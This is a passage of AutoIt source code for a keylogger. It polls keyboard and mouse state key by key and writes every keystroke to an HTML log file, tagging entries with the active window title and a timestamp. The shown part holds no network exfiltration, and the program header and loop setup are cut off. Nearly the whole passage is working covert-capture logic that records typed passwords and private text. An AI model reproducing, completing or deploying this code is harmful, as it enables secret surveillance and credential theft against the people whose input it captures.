
;---------------------------------------------end program header, begin program----------------------------
If _IsPressed(41) Then
	_LogKeyPress("a")
EndIf


If _IsPressed(42) Then
	_LogKeyPress("b")
EndIf


If _IsPressed(43) Then
	_LogKeyPress("c")
EndIf


If _IsPressed(44) Then
	_LogKeyPress("d")
EndIf


If _IsPressed(45) Then
	_LogKeyPress("e")
EndIf


If _IsPressed(46) Then
	_LogKeyPress("f")
EndIf


If _IsPressed(47) Then
	_LogKeyPress("g")
EndIf


If _IsPressed(48) Then
	_LogKeyPress("h")
EndIf


If _IsPressed(49) Then
	_LogKeyPress("i")
EndIf


If _IsPressed('4a') Then
	_LogKeyPress("j")
EndIf


If _IsPressed('4b') Then
	_LogKeyPress("k")
EndIf


If _IsPressed('4c') Then
	_LogKeyPress("l")
EndIf


If _IsPressed('4d') Then
	_LogKeyPress("m")
EndIf


If _IsPressed('4e') = 1 Then
	_LogKeyPress("n")
EndIf


If _IsPressed('4f') Then
	_LogKeyPress("o")
EndIf


If _IsPressed(50) Then
	_LogKeyPress("p")
EndIf


If _IsPressed(51) Then
	_LogKeyPress("q")
EndIf


If _IsPressed(52) Then
	_LogKeyPress("r")
EndIf


If _IsPressed(53) Then
	_LogKeyPress("s")
EndIf


If _IsPressed(54) Then
	_LogKeyPress("t")
EndIf


If _IsPressed(55) Then
	_LogKeyPress("u")
EndIf


If _IsPressed(56) Then
	_LogKeyPress("v")
EndIf


If _IsPressed(57) Then
	_LogKeyPress("w")
EndIf


If _IsPressed(58) Then
	_LogKeyPress("x")
EndIf


If _IsPressed(59) Then
	_LogKeyPress("y")
EndIf

If _IsPressed('5a') Then
	_LogKeyPress("z")
EndIf


If _IsPressed('01') Then
	_LogKeyPress("<font color=#008000 style=font-size:9px><i>{LEFT MOUSE}</i></font>")
EndIf

If _IsPressed('02') Then
	_LogKeyPress("<font color=#008000 style=font-size:9px><i>{RIGHT MOUSE}</i></font>")
EndIf


If _IsPressed('08') Then
	_LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{BACKSPACE}</i></font>")
EndIf


If _IsPressed('09') Then
	_LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{TAB}</i></font>")
EndIf


If _IsPressed('0d') Then
	_LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{ENTER}</i></font>")
EndIf


If _IsPressed('10') Then
	_LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{SHIFT}</i></font>")
EndIf


If _IsPressed('11') Then
	_LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{CTRL}</i></font>")
EndIf


If _IsPressed('12') Then
	_LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{ALT}</i></font>")
EndIf


If _IsPressed('13') Then
	_LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{PAUSE}</i></font>")
EndIf


If _IsPressed('14') Then
	_LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{CAPSLOCK}</i></font>")
EndIf


If _IsPressed('1b') Then
	_LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{ESC}</i></font>")
EndIf


If _IsPressed('20') Then
	_LogKeyPress(" ")
EndIf


If _IsPressed('21') Then
	_LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{PGUP}</i></font>")
EndIf


If _IsPressed('22') Then
	_LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{PGDOWN}</i></font>")
EndIf


If _IsPressed('23') Then
	_LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{END}</i></font>")
EndIf


If _IsPressed('24') Then
	_LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{HOME}</i></font>")
EndIf


If _IsPressed('25') Then
	_LogKeyPress("<font color=#008000 style=font-size:9px><i>{LEFT ARROW}</i></font>")
EndIf


If _IsPressed('26') Then
	_LogKeyPress("<font color=#008000 style=font-size:9px><i>{UP ARROW}</i></font>")
EndIf


If _IsPressed('27') Then
	_LogKeyPress("<font color=#008000 style=font-size:9px><i>{RIGHT ARROW}</i></font>")
EndIf


If _IsPressed('28') Then
	_LogKeyPress("<font color=#008000 style=font-size:9px><i>{DOWN ARROW}</i></font>")
EndIf


If _IsPressed('2c') Then
	_LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{PRNTSCRN}</i></font>")
EndIf


If _IsPressed('2d') Then
	_LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{INSERT}</i></font>")
EndIf


If _IsPressed('2e') Then
	_LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{DEL}</i></font>")
EndIf

If _IsPressed('30') Then
	_LogKeyPress("0")
EndIf


If _IsPressed('31') Then
	_LogKeyPress("1")
EndIf


If _IsPressed('32') Then
	_LogKeyPress("2")
EndIf


If _IsPressed('33') Then
	_LogKeyPress("3")
EndIf


If _IsPressed('34') Then
	_LogKeyPress("4")
EndIf


If _IsPressed('35') Then
	_LogKeyPress("5")
EndIf


If _IsPressed('36') Then
	_LogKeyPress("6")
EndIf


If _IsPressed('37') Then
	_LogKeyPress("7")
EndIf


If _IsPressed('38') Then
	_LogKeyPress("8")
EndIf


If _IsPressed('39') Then
	_LogKeyPress("9")
EndIf

;### Tidy Error: next line creates a negative tablevel.
;### Tidy Error: next line creates a negative tablevel for the line after it.
WEnd


Func _LogKeyPress($what2log)
	$window = WinGetTitle("")
	If $window = $window2 Then
		FileWrite($file, $what2log)
		Sleep(100)
	Else
		$window2 = $window
		FileWrite($file, "<br><BR>" & "<b>[" & @YEAR & "." & @MON & "." & @MDAY & "  " & @HOUR & ":" & @MIN & ":" & @SEC & ']  Window: "' & $window & '"</b><br>' & $what2log)
		Sleep(100)
	EndIf
EndFunc   ;==>_LogKeyPress